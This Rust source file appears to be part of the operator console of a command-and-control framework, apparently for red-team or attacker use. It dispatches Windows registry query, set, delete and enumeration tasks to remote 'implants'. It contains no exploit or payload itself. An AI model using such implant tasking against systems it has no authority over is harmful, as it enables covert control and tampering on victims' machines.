//! Windows registry commands

use anyhow::Result;
use common::ImplantId;
use prost::Message;

use crate::cli::CliState;
use crate::display::{print_info, print_success};

/// Map a registry type string to its numeric value (REG_SZ=1, REG_BINARY=3, REG_DWORD=4, etc.)
fn reg_type_to_u32(reg_type: &str) -> u32 {
    match reg_type.to_uppercase().as_str() {
        "REG_SZ" => 1,
        "REG_EXPAND_SZ" => 2,
        "REG_BINARY" => 3,
        "REG_DWORD" => 4,
        "REG_MULTI_SZ" => 7,
        "REG_QWORD" => 11,
        _ => 1, // Default to REG_SZ
    }
}

/// Query a registry key or value at the given path
pub async fn query(cli: &CliState, path: &str) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!("Querying registry: {}", path));
    let task = protocol::RegistryTask {
        operation: Some(protocol::registry_task::Operation::Query(protocol::RegQuery {
            key_path: path.to_string(),
            value_name: None,
        })),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "reg", task_data).await?;
    print_success(&format!("Registry query task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Output will be available via 'jobs output'");

    Ok(())
}

/// Set a registry value at the given path with the specified type and data
pub async fn set(cli: &CliState, path: &str, name: &str, reg_type: &str, data: &str) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!("Setting registry value: {}\\{}", path, name));
    let task = protocol::RegistryTask {
        operation: Some(protocol::registry_task::Operation::Set(protocol::RegSet {
            key_path: path.to_string(),
            value_name: name.to_string(),
            data: data.as_bytes().to_vec(),
            value_type: reg_type_to_u32(reg_type),
            create_key: None,
        })),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "reg", task_data).await?;
    print_success(&format!("Registry set task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}

/// Delete a registry value by name under the given key path
pub async fn delete(cli: &CliState, path: &str, name: &str) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!("Deleting registry value: {}\\{}", path, name));
    let task = protocol::RegistryTask {
        operation: Some(protocol::registry_task::Operation::Delete(protocol::RegDelete {
            key_path: path.to_string(),
            value_name: Some(name.to_string()),
            recursive: None,
        })),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "reg", task_data).await?;
    print_success(&format!("Registry delete task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}

/// Enumerate all subkeys under the given registry key path
pub async fn enum_keys(cli: &CliState, path: &str) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!("Enumerating subkeys: {}", path));
    let task = protocol::RegistryTask {
        operation: Some(protocol::registry_task::Operation::EnumKeys(protocol::RegEnumKeys {
            key_path: path.to_string(),
            recursive: None,
        })),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "reg", task_data).await?;
    print_success(&format!("Registry enum_keys task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Output will be available via 'jobs output'");

    Ok(())
}

/// Enumerate all values under the given registry key path
pub async fn enum_values(cli: &CliState, path: &str) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!("Enumerating values: {}", path));
    let task = protocol::RegistryTask {
        operation: Some(protocol::registry_task::Operation::EnumValues(protocol::RegEnumValues {
            key_path: path.to_string(),
        })),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "reg", task_data).await?;
    print_success(&format!("Registry enum_values task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Output will be available via 'jobs output'");

    Ok(())
}
